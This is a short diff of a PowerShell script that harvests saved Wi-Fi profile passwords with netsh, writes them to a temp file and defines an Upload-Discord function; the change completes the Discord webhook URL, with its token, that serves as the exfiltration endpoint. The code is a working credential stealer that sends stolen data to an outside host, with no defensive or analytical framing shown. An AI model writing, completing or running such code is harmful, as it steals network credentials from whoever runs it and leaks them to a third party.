@@ -6,7 +6,7 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 # Webhook Discord
-$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
+$dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 
 function Upload-Discord {
 
